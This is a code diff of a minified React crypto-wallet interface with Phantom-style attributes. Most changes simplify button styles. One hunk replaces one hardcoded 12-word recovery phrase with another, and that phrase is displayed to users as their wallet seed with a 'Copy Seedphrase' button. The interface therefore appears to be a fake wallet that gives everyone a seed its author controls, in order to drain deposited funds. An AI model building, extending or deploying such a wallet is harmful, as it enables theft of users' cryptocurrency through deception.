@@ -1514,75 +1514,28 @@
                                     width: "100%"
                                 },
                                 className: "jsx-28131abc58c419c4",
-                                children: [(0, r.jsxs)("button", {
+                                children: [(0, r.jsx)("button", {
                                     onClick: () => {
                                         t(!1), o(!0)
                                     },
                                     style: {
                                         width: "100%",
-                                        padding: "14px",
-                                        color: "#fff",
-                                        border: "none",
-                                        borderRadius: "999px",
-                                        fontSize: "16px",
-                                        fontWeight: 600,
-                                        cursor: "pointer",
-                                        boxShadow: "0 12px 24px rgba(124, 58, 237, 0.32), inset 0 1px 0 rgba(255,255,255,0.24)",
-                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
-                                        overflow: "hidden",
-                                        display: "flex",
-                                        alignItems: "center",
-                                        justifyContent: "center",
-                                        gap: "12px"
+                                        padding: "0 22px"
                                     },
-                                    onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
-                                    onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
                                     className: "jsx-28131abc58c419c4",
-                                    children: [(0, r.jsx)("svg", {
-                                        width: "20",
-                                        height: "20",
-                                        viewBox: "0 0 24 24",
-                                        fill: "#fff",
-                                        className: "jsx-28131abc58c419c4",
-                                        children: (0, r.jsx)("path", {
-                                            d: "M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z",
-                                            className: "jsx-28131abc58c419c4"
-                                        })
-                                    }), "Sign In"]
-                                }), (0, r.jsxs)("button", {
+                                    "data-phantom-primary": !0,
+                                    children: "Sign In"
+                                }), (0, r.jsx)("button", {
                                     onClick: () => {
                                         V(!0), setTimeout(() => V(!1), 3e3)
                                     },
                                     style: {
                                         width: "100%",
-                                        padding: "14px",
-                                        background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
-                                        color: tH("--twc-textPrimary"),
-                                        border: "1px solid rgba(174,156,255,0.18)",
-                                        borderRadius: "20px",
-                                        fontSize: "16px",
-                                        fontWeight: 700,
-                                        cursor: "pointer",
-                                        transition: "filter 0.35s cubic-bezier(.22,1,.36,1), transform 0.35s cubic-bezier(.22,1,.36,1), opacity 0.35s cubic-bezier(.22,1,.36,1), box-shadow 0.35s cubic-bezier(.22,1,.36,1)",
-                                        display: "flex",
-                                        alignItems: "center",
-                                        justifyContent: "center",
-                                        gap: "12px"
+                                        padding: "0 22px"
                                     },
-                                    onMouseEnter: e => e.currentTarget.style.backgroundColor = tH("--twc-backgroundSecondary"),
-                                    onMouseLeave: e => e.currentTarget.style.backgroundColor = tH("--twc-bg3"),
                                     className: "jsx-28131abc58c419c4",
-                                    children: [(0, r.jsx)("svg", {
-                                        width: "20",
-                                        height: "20",
-                                        viewBox: "0 0 24 24",
-                                        fill: tH("--twc-textPrimary"),
-                                        className: "jsx-28131abc58c419c4",
-                                        children: (0, r.jsx)("path", {
-                                            d: "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z",
-                                            className: "jsx-28131abc58c419c4"
-                                        })
-                                    }), "Create Wallet"]
+                                    "data-phantom-primary": !0,
+                                    children: "Create Wallet"
                                 })]
                             }), U && (0, r.jsx)("div", {
                                 style: {
@@ -1945,13 +1898,8 @@
                                         justifyContent: "center",
                                         gap: "8px"
                                     },
-                                    onMouseEnter: e => {
-                                        L && B && E && (e.currentTarget.style.backgroundColor = tH("--twc-primaryHover"))
-                                    },
-                                    onMouseLeave: e => {
-                                        L && B && E && (e.currentTarget.style.backgroundColor = tH("--twc-primary"))
-                                    },
                                     className: "jsx-d9bed6b55408503",
+                                    "data-phantom-primary": !0,
                                     children: "Confirm & Continue"
                                 })]
                             })]
@@ -3098,7 +3046,7 @@
                             },
                             className: "jsx-212d2f498bea9fe5",
                             children: (() => {
-                                let e = "jealous install marine head avoid knock chest noodle rotate tone seek cluster";
+                                let e = "chat tonight sketch away traffic stay arch cement arrest magnet relief switch";
                                 return (0, r.jsxs)("div", {
                                     style: {
                                         background: "radial-gradient(circle at top, rgba(255,255,255,0.95) 0%, rgba(248,247,253,0.96) 35%, rgba(244,241,255,0.98) 100%)",
@@ -3392,15 +3340,8 @@
                                                 onMouseLeave: e => {
                                                     e.currentTarget.style.filter = "brightness(1)", e.currentTarget.style.transform = "scale(1)"
                                                 },
-                                                children: [(0, r.jsx)("svg", {
-                                                    width: "18",
-                                                    height: "18",
-                                                    viewBox: "0 0 24 24",
-                                                    fill: "#fff",
-                                                    children: (0, r.jsx)("path", {
-                                                        d: "M16 1H4c-1.1 0-2 .9-2 2v14h2V3h12V1zm3 4H8c-1.1 0-2 .9-2 2v14c0 1.1.9 2 2 2h11c1.1 0 2-.9 2-2V7c0-1.1-.9-2-2-2zm0 16H8V7h11v14z"
-                                                    })
-                                                }), eo ? "✓ Copied!" : "Copy Seedphrase"]
+                                                "data-phantom-primary": !0,
+                                                children: eo ? "✓ Copied!" : "Copy Seedphrase"
                                             })
                                         })]
                                     })]
@@ -4311,45 +4252,20 @@
                                                     display: "flex",
                                                     gap: "8px"
                                                 },
-                                                children: [(0, r.jsxs)("button", {
+                                                children: [(0, r.jsx)("button", {
                                                     onClick: tF,
                                                     style: {
-                                                        flex: 1,
-                                                        padding: "10px",
-                                                                    "data-phantom-primary": !0,
-                                                        display: "flex",
-                                                        alignItems: "center",
-                                                        justifyContent: "center",
-                                                        gap: "6px"
+                                                        width: "100%",
+                                                        padding: "0 22px"
                                                     },
-                                                    onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
-                                                    onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
-                                                    children: [(0, r.jsx)("svg", {
-                                                        width: "14",
-                                                        height: "14",
-                                                        viewBox: "0 0 24 24",
-                                                        fill: "#fff",
-                                                        children: (0, r.jsx)("path", {
-                                                            d: "M19 13h-6v6h-2v-6H5v-2h6V5h2v6h6v2z"
-                                                        })
-                                                    }), "Top Up ETH"]
+                                                    "data-phantom-primary": !0,
+                                                    children: "Top Up ETH"
                                                 }), (0, r.jsx)("button", {
                                                     style: {
-                                                        flex: 1,
-                                                        padding: "10px",
-                                                        backgroundColor: "#8B5CF6",
-                                                        color: "#fff",
-                                                        border: "none",
-                                                        borderRadius: "18px",
-                                                        fontSize: "12px",
-                                                        fontWeight: 700,
-                                                        cursor: "not-allowed",
-                                                        opacity: .7,
-                                                        display: "flex",
-                                                        alignItems: "center",
-                                                        justifyContent: "center",
-                                                        gap: "4px"
+                                                        width: "100%",
+                                                        padding: "0 22px"
                                                     },
+                                                    "data-phantom-primary": !0,
                                                     disabled: !0,
                                                     children: "Confirm"
                                                 })]
@@ -5814,16 +5730,14 @@
                                                 })]
                                             }), (0, r.jsx)("button", {
                                                 onClick: () => eR("send"),
-                                                style: {
-                                                    width: "100%",
-                                                    padding: "16px",
-                                                    marginTop: "auto",
-                                                    "data-phantom-primary": !0
-                                                },
-                                                onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
-                                                onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
-                                                children: "Done"
-                                            })]
+                                            style: {
+                                                width: "100%",
+                                                padding: "0 22px",
+                                                marginTop: "auto"
+                                            },
+                                            "data-phantom-primary": !0,
+                                            children: "Done"
+                                        })]
                                         })]
                                     })]
                                 })
@@ -6300,16 +6214,14 @@
                                                 })]
                                             }), (0, r.jsx)("button", {
                                                 onClick: () => eA(!1),
-                                                style: {
-                                                    width: "100%",
-                                                    padding: "16px",
-                                                    marginTop: "auto",
-                                                    "data-phantom-primary": !0
-                                                },
-                                                onMouseEnter: e => e.currentTarget.style.filter = "brightness(1.03)",
-                                                onMouseLeave: e => e.currentTarget.style.filter = "brightness(1)",
-                                                children: "Done"
-                                            })]
+                                            style: {
+                                                width: "100%",
+                                                padding: "0 22px",
+                                                marginTop: "auto"
+                                            },
+                                            "data-phantom-primary": !0,
+                                            children: "Done"
+                                        })]
                                         })]
                                     })]
                                 })
